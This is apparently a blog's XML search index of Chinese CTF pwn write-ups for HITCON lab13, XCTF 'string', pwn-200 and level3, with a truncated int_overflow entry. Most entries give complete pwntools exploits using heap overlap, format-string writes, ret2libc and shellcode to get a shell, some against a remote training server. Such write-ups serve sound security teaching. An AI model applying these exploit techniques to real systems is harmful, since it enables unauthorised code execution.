<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[HITCON Trainging lab13]]></title>
      <url>/2020/04/16/HITCON-Trainging-lab13/</url>
      <content type="html"><![CDATA[<h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p>chunk-extend学习，一个友好的题目，<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">下载地址</a></p>
<h3 id="0x00-程序分析"><a href="#0x00-程序分析" class="headerlink" title="0x00 程序分析"></a>0x00 程序分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/heapcreator&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>64位elf，开启了Canary和NX保护</p>
<p>分析main函数</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1586611734293.md.png" alt="1" title class>
                <p>1</p>
            </figure>
<p>大概是一个自定义的堆分配器，每个堆主要有两个成员：大小与内容指针</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会<strong>存在 <a href="https://blog.csdn.net/nibiru_holmes/article/details/62040763" target="_blank" rel="noopener">off-by-one</a>的漏洞</strong>。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>函数edit_heap()</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1586612923039.md.png" alt="1586612923039" title class>
                <p>1586612923039</p>
            </figure>
<p>heaparray[v1]中存放的是chunk的size,(*heaparray[v1]+1)其实就是heaparray[v1+1]中存放的是堆的指针。</p>
<p>分析create_heap()</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1586613176346.png" alt="1586613176346" title class>
                <p>1586613176346</p>
            </figure>
<p>heaparray就在堆上,可以直接改heaparray上的指针。</p>
<p>基本利用思路:</p>
<ol>
<li>利用off by one 漏洞覆盖下一个chunk 的 size 字段，从而构造伪造的 chunk 大小。</li>
<li>申请伪造的 chunk 大小，从而产生 chunk overlap，进而修改关键指针。</li>
</ol>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">heap = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">＃将堆<span class="number">1</span>的结构大小改写为<span class="number">0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">＃触发堆<span class="number">1</span>的结构到fastbin <span class="number">0x40</span></span><br><span class="line">＃将<span class="number">1</span>的内容堆到fastbin <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">＃新堆<span class="number">1</span>的结构将指向旧堆<span class="number">1</span>的内容，大小为<span class="number">0x20</span></span><br><span class="line">＃新堆<span class="number">1</span>的内容将指向旧堆<span class="number">1</span>的结构，大小为<span class="number">0x30</span></span><br><span class="line">＃也就是说我们可以覆盖新堆<span class="number">1</span>的结构</span><br><span class="line">＃在这里，我们将其堆内容指针覆盖为free @ got</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak freeaddr</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment">#用系统地址覆盖free @ got</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#trigger system("/bin/sh")</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<p>最后，记录下一位师傅做到<a href="https://blog.csdn.net/qq_40934487/article/details/91465347" target="_blank" rel="noopener">一道堆题的博客</a></p>
<p>​     </p>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,string]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-string/</url>
      <content type="html"><![CDATA[<h2 id="攻防世界-新手区-string"><a href="#攻防世界-新手区-string" class="headerlink" title="攻防世界 新手区  string"></a>攻防世界 新手区  string</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00  函数分析"></a>0x00  函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/string&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>64位，开启了Canary和NX保护， RELRO。</p>
<p>载入IDA,分析逻辑，进入函数sub_400D72(),有三个函数， sub_400A7D();<br>sub_400BB9(); sub_400CA6((_DWORD *)a1);</p>
<p>函数sub_400BB9();</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1585958469569.md.png" alt="1585958469569" title class>
                <p>1585958469569</p>
            </figure>
<p>存在格式化字符串漏洞，可以进行任意地址写。</p>
<p> 函数sub_400CA6((_DWORD *)a1)</p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1585958551908.md.png" alt="1585958551908" title class>
                <p>1585958551908</p>
            </figure>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1585958656637.md.png" alt="1585958656637" title class>
                <p>1585958656637</p>
            </figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</span><br></pre></td></tr></table></figure>
<p>这条指令将v1强制转化为函数指针类型，再汇编代码中可以看到，转化后调用；</p>
<p>执行这条语句的条件是*a1 == a1[1]，a1为传入的参数，回溯发现a1即函数sub_400D72传入的v4，而v4 = (__int64)v3，其中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*v3 = 68;   <span class="comment">#即v3[0] = 68;</span></span><br><span class="line">v3[1] = 85;</span><br></pre></td></tr></table></figure>
<p>即要令<em>a1 == a1[1]，则需要</em>v3 == v3[1]。需要修改v3[0]为85</p>
<p>而v3[0]的地址则在，main函数内可得到</p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1585959372877.md.png" alt="1585959372877" title class>
                <p>1585959372877</p>
            </figure>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>根据程序流程执行输入，函数sub_400A7D()中注意输入east即可跳出;进入函数sub_400BB9()。</p>
<p>在64位程序函数调用约定，前六个参数从左到右放入<em>RDI</em>, <em>RSI</em>, <em>RDX</em>, <em>ECX</em>, <em>R8</em>, <em>R9</em>中，利用<strong>格式化字符串漏洞</strong>，进入脆弱点，写入shellcode。可参考大佬博客</p>
<p><a href="https://blog.csdn.net/xkj2010yj/article/details/104648885?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1" target="_blank" rel="noopener">https://blog.csdn.net/xkj2010yj/article/details/104648885?depth_1-utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1&amp;utm_source=distribute.pc_relevant.none-task-blog-OPENSEARCH-1</a></p>
<p>所以从n = 7开始，我们可以修改栈中的数据为85。</p>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#sh = process('./string')</span></span><br><span class="line">sh=remote(<span class="string">'111.198.29.45'</span>,<span class="number">41867</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'secret[0] is '</span>)</span><br><span class="line">v3_addr = int(sh.recvuntil(<span class="string">"\n"</span>),<span class="number">16</span>)</span><br><span class="line">print(v3_addr)</span><br><span class="line">sh.recvuntil(<span class="string">'name be:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'zzz'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'east or up?:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'east'</span>)</span><br><span class="line">sh.recvuntil(<span class="string">'leave(0)?:'</span>)</span><br><span class="line">sh.sendline(<span class="string">'1'</span>)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'\'Give me an address\''</span>)</span><br><span class="line">sh.sendline(str(v3_addr))</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'you wish is:'</span>)</span><br><span class="line">payload = <span class="string">'%085d'</span> + <span class="string">'%7$n'</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">'I will help you! USE YOU SPELL'</span>)</span><br><span class="line">sh.sendline(asm(shellcraft.amd64.linux.sh(),arch=<span class="string">"amd64"</span>))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 格式化字符串 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,pwn200]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn200/</url>
      <content type="html"><![CDATA[<h2 id="攻防世界-新手区-pwn-200"><a href="#攻防世界-新手区-pwn-200" class="headerlink" title="攻防世界 新手区 pwn-200"></a>攻防世界 新手区 pwn-200</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/pwn/pwn-200&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位，开启了NX保护</p>
<p>载入IDA，反汇编看主函数</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1585978770147.png" alt="1585978770147" title class>
                <p>1585978770147</p>
            </figure>
<p>函数sub_8048484()</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1585978830995.png" alt="1585978830995" title class>
                <p>1585978830995</p>
            </figure>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>主要思路如下：</p>
<ul>
<li>利用DynELF泄露system地址 <a href="https://www.anquanke.com/post/id/8512" target="_blank" rel="noopener">DynELF方法参考</a></li>
<li>调用read函数，把‘/bin/sh‘写入bss段，作为system参数</li>
<li>调用system函数，getshell</li>
</ul>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line">p=remote(<span class="string">"111.198.29.45"</span>,<span class="number">30318</span>)</span><br><span class="line">elf=ELF(<span class="string">'./pwn-200'</span>)</span><br><span class="line">start=<span class="number">0x80483D0</span> </span><br><span class="line">write_addr=elf.plt[<span class="string">'write'</span>]</span><br><span class="line">read_addr=elf.plt[<span class="string">'read'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">(addr)</span>:</span></span><br><span class="line">	payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(write_addr)+p32(start)+p32(<span class="number">1</span>)+p32(addr)+p32(<span class="number">4</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Welcome to XDCTF2015~!\n"</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	buff=p.recv(<span class="number">4</span>)</span><br><span class="line">	<span class="keyword">return</span> buff</span><br><span class="line">dyn=DynELF(leak,elf=ELF(<span class="string">"./pwn-200"</span>))</span><br><span class="line">system=dyn.lookup(<span class="string">"system"</span>,<span class="string">"libc"</span>)</span><br><span class="line">print(<span class="string">"get system address:%X"</span> % system)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">()</span>:</span></span><br><span class="line">	bin=<span class="string">"/bin/sh"</span></span><br><span class="line">	bss=<span class="number">0x804A048</span><span class="comment">#使用bss结尾处的内存区域，read之后跳转到start，程序会再次修改stdin和stdout的值</span></span><br><span class="line">	payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(read_addr)+p32(start)+p32(<span class="number">0</span>)+p32(bss)+p32(<span class="number">8</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Welcome to XDCTF2015~!\n"</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.sendline(bin)</span><br><span class="line">write()</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">112</span>+p32(system)+p32(<span class="number">0</span>)+p32(<span class="number">0x804A048</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Welcome to XDCTF2015~!\n"</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,level3]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level3/</url>
      <content type="html"><![CDATA[<p>下载后解压两次，给了一个elf 和并且告诉libc版本</p>
<p>分享一位师傅写得，很详细，对我们小白很有帮助</p>
<p><a href="https://www.cnblogs.com/cloud-tree/p/11929585.html" target="_blank" rel="noopener">https://www.cnblogs.com/cloud-tree/p/11929585.html</a></p>
<h2 id="攻防世界-新手区-level3"><a href="#攻防世界-新手区-level3" class="headerlink" title="攻防世界 新手区 level3"></a>攻防世界 新手区 level3</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/level3&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位，开启NX保护</p>
<p>载入IDA</p>
<p>main函数</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1585968083816.png" alt="1585968083816" title class>
                <p>1585968083816</p>
            </figure>
<p><em>vulnerable_function</em>函数</p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1585968097663.png" alt="1585968097663" title class>
                <p>1585968097663</p>
            </figure>
<p>程序代码很少，在read()存在栈溢出</p>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>无system函数，无binsh字符串，有read和write函数，利用ret2libc。</p>
<p>主要思路有以下几点：</p>
<ul>
<li>libc中的函数的相对地址是固定的，要想获取到system函数的地址，可以通过write()函数进行offset计算。</li>
<li>在vulnerable_function()中，先调用了write()函数，然后调用read()函数。第一次攻击利用write()函数返回到vulnerable_function()后，再进行read()函数调用，这样就进行二次攻击。 </li>
<li>第一次攻击我们利用栈溢出将write()函数在got表中的真实地址泄露出来，然后减去libc中的offset，就可以得到libc的base address。</li>
<li>再利用相对offset计算出system和”/bin/sh”的真实地址</li>
<li>第二次攻击重新进入vulnerable_function()函数，再次通过栈溢出，利用system函数进行getshell。</li>
</ul>
<h3 id="0x02-exp"><a href="#0x02-exp" class="headerlink" title="0x02 exp"></a>0x02 exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=remote(<span class="string">'111.198.29.45'</span>,<span class="number">58174</span>)</span><br><span class="line"><span class="comment">#p=process('./level3')</span></span><br><span class="line">elf=ELF(<span class="string">"./level3"</span>)</span><br><span class="line"></span><br><span class="line">writeplt=elf.plt[<span class="string">"write"</span>]</span><br><span class="line">writegot=elf.got[<span class="string">"write"</span>]</span><br><span class="line">func=elf.symbols[<span class="string">"vulnerable_function"</span>]</span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">"./libc_32.so.6"</span>)</span><br><span class="line">writelibc=libc.symbols[<span class="string">"write"</span>]</span><br><span class="line">syslibc=libc.symbols[<span class="string">"system"</span>]</span><br><span class="line">binlibc=libc.search(<span class="string">"/bin/sh"</span>).next()</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">'a'</span>*<span class="number">140</span>+p32(writeplt)+p32(func)+p32(<span class="number">1</span>)+p32(writegot)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">addr=p.recv(<span class="number">4</span>)</span><br><span class="line">writeaddr=u32(addr)</span><br><span class="line"></span><br><span class="line">sysaddr=writeaddr-writelibc+syslibc</span><br><span class="line">binaddr=writeaddr-writelibc+binlibc</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">'a'</span>*<span class="number">140</span>+p32(sysaddr)+p32(<span class="number">0xaaaa</span>)+p32(binaddr)</span><br><span class="line">p.recvuntil(<span class="string">"Input:\n"</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 栈溢出 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[攻防世界,int_overflow]]></title>
      <url>/2020/04/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/</url>
      <content type="html"><![CDATA[<h2 id="攻防世界-新手区-整数溢出"><a href="#攻防世界-新手区-整数溢出" class="headerlink" title="攻防世界 新手区  整数溢出"></a>攻防世界 新手区  整数溢出</h2><h3 id="0x00-函数分析"><a href="#0x00-函数分析" class="headerlink" title="0x00 函数分析"></a>0x00 函数分析</h3><p>基本信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &apos;/home/ububtu/ctf/int_overflow&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure>
<p>32位，开启NX保护</p>
<p>载入IDA，诶，看到了一个</p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1585964727164.png" alt="1585964727164" title class>
                <p>1585964727164</p>
            </figure>
<p>看来不用自己去构造了，看看怎么调用就可以了。</p>
<p>继续分析，发现了重要得函数check_passwd，进入</p>
<figure class="image-box">
                <img src="https://wx1.sbimg.cn/2020/04/20/1585964928961.png" alt="1585964928961" title class>
                <p>1585964928961</p>
            </figure>
<p>条件满足v3&gt;3u且v3&lt;8u时，可以进入下面的else中，在strcpy处有存在溢出</p>
<h3 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h3><p>想要利用else中得strcpy，需要控制passwd得长度，第一种方法是passwd长度&gt;3 &amp;&amp; &lt;=8，第二种是是利用整数溢出。</p>
<p>而在限制passwd长度，即v3时，汇编代码中为s</p>
<figure class="image-box">
                <img src="https://wx2.sbimg.cn/2020/04/20/1585966010822.png" alt="1585966010822" title class>
                <p>1585966010822</p>
            </figure>
<p>在检测s的长度之后，可以看到程序把s放到一个al寄存器中，al是一个八位寄存器，八位寄存器对于无符号整数来说范围是有0~255，所以利用整数溢出，则passwd得长度应为259~264。</p>
<p>第一种passwd太短，无法利用进行改写程序流，所以使用第二种思路。</p>
<p>程序中存在，可以将返回地址指向what_is_this()</p>
